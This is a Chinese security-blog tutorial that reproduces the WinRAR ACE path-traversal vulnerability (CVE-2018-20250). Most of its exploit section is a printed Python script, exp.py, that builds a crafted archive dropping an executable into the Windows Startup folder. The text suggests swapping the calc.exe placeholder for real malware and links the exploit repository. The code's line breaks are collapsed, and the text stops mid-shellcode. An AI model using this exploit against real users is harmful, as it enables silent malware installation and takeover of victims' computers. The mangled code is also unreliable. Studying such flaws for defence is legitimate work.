---
title: [漏洞挖掘与防护] 03.漏洞利用之WinRAR安全缺陷复现（CVE-2018-20250）及软件自启动分析
url: https://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247500748&idx=1&sn=4de2b05a37a8facd043380f16ed6ced3&chksm=cfcf7301f8b8fa175cbf53f57ba32424ba7b11dd70a4ae2a3c28c82cc6e4ee4fa4993c7ab89c&scene=58&subscene=0#rd
source: 娜璋AI安全之家
date: 2024-08-27
fetch_date: 2025-10-06T18:08:27.143924
---

# [漏洞挖掘与防护] 03.漏洞利用之WinRAR安全缺陷复现（CVE-2018-20250）及软件自启动分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/0RFmxdZEDROLqpDCG8icFaWSTjKB8kIDbdUYOuH6BeiaZYrkiaYgtE1dvG73AU3MgNRDJmLTo7JlBKPcWQFIHfZJA/0?wx_fmt=jpeg)

# [漏洞挖掘与防护] 03.漏洞利用之WinRAR安全缺陷复现（CVE-2018-20250）及软件自启动分析

原创

Eastmount

娜璋AI安全之家

> “
>
> 2024年4月28日是Eastmount的安全星球 —— 『网络攻防和AI安全之家』正式创建和运营的日子，该星球目前主营业务为 安全零基础答疑、安全技术分享、AI安全技术分享、AI安全论文交流、威胁情报每日推送、网络攻防技术总结、系统安全技术实战、面试求职、安全考研考博、简历修改及润色、学术交流及答疑、人脉触达、认知提升等。下面是星球的新人券，欢迎新老博友和朋友加入，一起分享更多安全知识，比较良心的星球，非常适合初学者和换安全专业的读者学习。
>
> ”

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROLqpDCG8icFaWSTjKB8kIDbkxVUHG9pQia5x1Rkka4TCJImxS16V6SUruN7aS6sRCuAqpQuuR3bicbQ/640?wx_fmt=png&from=appmsg)

这是作者新开的一个专栏——“漏洞挖掘与防护”，前期会复现各种经典和最新漏洞，并总结防护技巧；后期尝试从零学习漏洞挖掘技术，包括Web漏洞和二进制及IOT相关漏洞，以及Fuzzing技术。新的征程，新的开启，漫漫长征路，偏向虎山行。享受过程，感谢您的陪伴，一起加油~

**忙碌的暑假结束，脚踏实地，继续奋斗！**

上一篇文章将详细介绍MS08-067远程代码执行漏洞（CVE-2008-4250）及防御过程，它是Windows Server服务RPC请求缓冲区溢出漏洞，利用445端口，并通过Metasploit工具获取shell及进行深入的操作。这篇文章将详细讲解WinRAR漏洞（CVE-2018-20250），并复现了该漏洞和讲解了恶意软件自启动劫持原理。基础性文章，希望对入门的同学有帮助。

话不多说，让我们开始新的征程吧！您的点赞、评论、收藏将是对我最大的支持，感恩安全路上一路前行，如果有写得不好的地方，还请海涵。基础性文章，希望对您有所帮助，作者的目的是与安全人共同进步，加油！也强烈推荐大家去看看参考文献的视频和书籍。

**文章目录：**

* 一.学习路线
* 二.WinRAR漏洞复现

+ 1.复现
+ 2.原理及预防

* 三.恶意软件劫持原理

+ 1.WinRAR恶意攻击升级案例1
+ 2.WinRAR恶意攻击升级案例2

* 四.总结

前文赏析：

* [[漏洞挖掘与防护] 01.漏洞利用之CVE-2019-0708复现及防御详解（含学习路线）](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247500545&idx=1&sn=c368de62b1799d9850c42c3a7bca72e9&chksm=cfcf73ccf8b8fada84a8d0b81cb313c35bf108bcfae8ac34fb05574fdbbf5b6fdf83620cba41&scene=21#wechat_redirect)
* [[漏洞挖掘与防护] 02.漏洞利用之MS08-067远程代码执行漏洞复现及深度防御](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247500579&idx=1&sn=ed3c9232e67f1e244ff09da7db10d0b8&chksm=cfcf73eef8b8faf886676005ab6a5702e6e37443049fcec999ae10c3ca3db386b039b73e9a42&scene=21#wechat_redirect)
* [漏洞挖掘与防护] 03.漏洞利用之WinRAR安全缺陷复现（CVE-2018-20250）及软件自启动分析

> 声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。

---

# 一.学习路线

下面是本人准备从零学习漏洞挖掘（Fuzzing入门）的部分技术路线，作为初学者分享与大家学习，也欢迎大家留言补充和讨论，共勉。

1.基础

* 南大《程序分析》
  https://www.bilibili.com/video/BV1b7411K7P4
  https://haotianmichael.github.io/2021/05/04/NJU静态程序分析-1-Data-Flow-Analysis/
* fuzzingbook
  https://www.fuzzingbook.org/
* Fuzzing101
  https://github.com/antonio-morales/Fuzzing101
  https://blog.attify.com/fuzzing-iot-devices-part-1/
* 顶会论文阅读：安全四大顶会+软工顶会

2.技术

* AFL （源码解读）
* angr （直接从github学习吗？）：基本用法->实例
* 模糊测试、污点分析、符号执行【动静态】
* Ghidra（二进制、开源代表性工具）
* 内核模糊测试工具：syzkaller
* ASAN
* codeql
* MIASM

3.实战

* 固件漏洞实际分析
* 协议漏洞挖掘
* 软件漏洞挖掘
* Web渗透
* IoT漏洞分析（路由设备）
* 区块链漏洞挖掘（智能合约）
* CVE和CNVD申请
* n-day复现 => 0-day挖掘

4.趋势

* LLM+Fuzzing：推荐作者分享的南洋理工大学刘杨教授笔记（见『网络攻防和AI安全之家』知识星球）
* Web3+Fuzzing
* 卫星+Fuzzing

---

# 二.WinRAR漏洞复现

## 1.复现

WinRAR漏洞（CVE-2018-20250）是Check Point团队于2019年2月爆出的严重安全漏洞，该漏洞已存在于WinRAR中19年，由于WinRAR使用了一个陈旧的UNACEV2.dll动态链接库造成的。当我们解压任意ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，将恶意软件写入操作系统启动Startup文件夹，并且电脑重启时会自动运行该程序，从而造成恶意软件劫持。通过该漏洞可以获得受害者计算机的控制。安全专家表示全球有超过5亿用户受到WinRAR漏洞影响。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROLqpDCG8icFaWSTjKB8kIDbtp1vguR4aU73L9FJMURAEicCXRQp4FrJfWxu1xJW2M9wyu89oS3GU8g/640?wx_fmt=png&from=appmsg)

下面我们先来复现该漏洞。该漏洞会对多种压缩软件造成影响，版本如下：

* WinRAR < 5.70 Beta 1
* Bandizip < = 6.2.0.0
* 好压(2345压缩) < = 5.9.8.10907
* 360压缩 < = 4.0.0.1170

第一步，安装WinRAR 5.6.1的版本，后续5.7升级弥补了该漏洞。作者的电脑是Win10操作系统。

![](https://mmbiz.qpic.cn/mmbiz_jpg/0RFmxdZEDROLqpDCG8icFaWSTjKB8kIDbvjIsN2RaqDruey5bEygWatjbpbgPf6E2V84EQY0hCs8232qv56CEzQ/640?wx_fmt=jpeg&from=appmsg)

安装之后可以看到本地存在的UNACEV2.DLL动态链接库，它就是被利用的入口。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROLqpDCG8icFaWSTjKB8kIDbcUACTPTwrfmCoibwM8xpIyicBQ2YHXKc0hjIgGmrARwK8e7XDAAS6leA/640?wx_fmt=png&from=appmsg)

第二步，从github中下载漏洞利用程序，如下图所示。

* hello.txt和world.txt是需要压缩的文件
* calc.exe是计算器，可以替换成恶意软件，它会被定向植入系统启动目录
* exp.py是运行的Python代码，它会将hello.txt和world.txt压缩，并隐藏恶意软件
* acefile.py是利用UNACEV2.DLL漏洞的代码，共4000多行
  下载地址：https://github.com/backlion/CVE-2018-20250

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROLqpDCG8icFaWSTjKB8kIDb3iaGWyo9TnkEks4GEDMicVxjW4Jp8DAWESqNuETtjQMK8YlAdVVOz5kw/640?wx_fmt=png&from=appmsg)

我们尝试打开exp.py文件，代码如下，其中恶意软件为“calc.exe”、压缩包名称为“test.rar”、需要压缩的文件为“hello.txt”和“world.txt”、隐藏的路径为Windows系统开机启动的目录，并命名为“hi.exe”。读者也可以尝试修改名称，自定义需要压缩的文件及恶意软件。

```
#!/usr/bin/env python3
import osimport reimport zlibimport binascii
# The archive filename you wantrar_filename = "test.rar"# The evil file you want to runevil_filename = "calc.exe"# The decompression path you want, such shown belowtarget_filename = r"C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe"# Other files to be displayed when the victim opens the winrar# filename_list=[]filename_list = ["hello.txt", "world.txt"]
class AceCRC32:    def __init__(self, buf=b''):        self.__state = 0        if len(buf) > 0:            self += buf
    def __iadd__(self, buf):        self.__state = zlib.crc32(buf, self.__state)        return self
    def __eq__(self, other):        return self.sum == other
    def __format__(self, format_spec):        return self.sum.__format__(format_spec)
    def __str__(self):        return "0x%08x" % self.sum
    @property    def sum(self):        return self.__state ^ 0xFFFFFFFF
def ace_crc32(buf):    return AceCRC32(buf).sum
def get_ace_crc32(filename):    with open(filename, 'rb') as f:        return ace_crc32(f.read())
def get_right_hdr_crc(filename):    # This command may be different, it depends on the your Python3 environment.    p = os.popen('py -3 acefile.py --headers %s'%(filename))    res = p.read()    pattern = re.compile('right_hdr_crc : 0x(.*?) | struct')    result = pattern.findall(res)    right_hdr_crc = result[0].upper()    return hex2raw4(right_hdr_crc)
def modify_hdr_crc(shellcode, filename):    hdr_crc_raw = get_right_hdr_crc(filename)    shellcode_new = shellcode.replace("6789", hdr_crc_raw)    return shellcode_new
def hex2raw4(hex_value):    while len(hex_value) < 4:        hex_value = '0' + hex_value    return hex_value[2:] + hex_value[:2]
def hex2raw8(hex_value):    while len(hex_value) < 8:        hex_value = '0' + hex_value    return hex_value[6:] + hex_value[4:6] + hex_value[2:4] + hex_value[:2]
def get_file_content(filename):    with open(filename, 'rb') as f:        return str(binascii.hexlify(f.read()))[2:-1] # [2:-1] to remote b'...'
def make_shellcode(filename, target_filename):    if target_filename == "":        target_filename = filename    hdr_crc_raw = "6789"    hdr_size_raw = hex2raw4(str(hex(len(target_filename)+31))[2:])    packsize_raw = hex2raw8(str(hex(os.path.getsize(filename)))[2:])    origsize_raw = packsize_raw    crc32_raw = hex2raw8(str(hex(get_ace_crc32(filename)))[2:])    filename_len_raw = hex2raw4(str(hex(len(target_filename)))[2:])    filename_raw = "".join("{:x}".format(ord(c)) for c in target_filename)    content_raw = get_file_content(filename)    shellcode = hdr_crc_raw + hdr_size_raw + "010180" + packsize_raw \              + origsize_raw + "63B0554E20000000" + crc32_raw + "00030A005445"\              + filename_len_raw + filename_raw + "01020304050607080910A1A2A3A4A5A6A7A8A9"    return shellcode
def build_file(shellcode, filename):    with open(filename, "wb") as f:        f.write(binascii.a2b_hex(shellcode.upper()))
def build_file_add(shellcode, filename):    with open(filename, "ab+") as f:        f.write(binascii.a2b_hex(shellcode.upper()))
def build_file_once(filename, target_filename=""):    shellcode = make_shellcode(filename, target_filename)    build_file_add(shellcode, rar_filename)    shellcode_new = modify_hdr_crc(shellcode, rar_filename)    content_raw = get_file_content(rar_filename).upper()    build_file(content_raw.replace(shellcode.upper(),                                   shellcode_new.upper()).replace("01020304050607080910A1A2A3A4A5A6A7A8A9",                                                                  get_file_content(filename)), rar_filename)
if __name__ == '__main__':    print("[*] Start to generate the archive file %s..."%(rar_filename))
    shellcode_head = "6B2831000000902A2A4143452A2A141402001018564E974FF6AA00000000162A554E5245474...